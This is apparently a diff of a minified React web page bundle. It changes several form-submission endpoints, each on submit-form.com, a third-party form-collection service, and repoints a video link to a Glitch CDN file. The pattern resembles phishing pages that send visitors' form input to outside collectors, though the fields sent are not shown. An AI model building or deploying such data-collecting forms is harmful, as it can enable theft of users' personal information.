@@ -9814,7 +9814,7 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/4F52K0XR2", {
+                                    fetch("https://submit-form.com/ygEXWax6o", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13339,7 +13339,7 @@
                                 children: "Detailed Video Information."
                             }), (0,
                             he.jsx)("a", {
-                                href: "detailed_video.mp4",
+                                href: "https://cdn.glitch.global/ffd6bc0c-73ac-4bc3-87af-b34c18da3d3e/detailed_viedo.mp4?v=1732631783967",
                                 children: (0,
                                 he.jsx)("img", {
                                     src: me,
@@ -13358,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/ygEXWax6o", {
+                                    u && o ? (fetch("https://submit-form.com/IrUe485I3", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/J73pvmzIg", {
+                        fetch("https://submit-form.com/L2joBfHfp", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
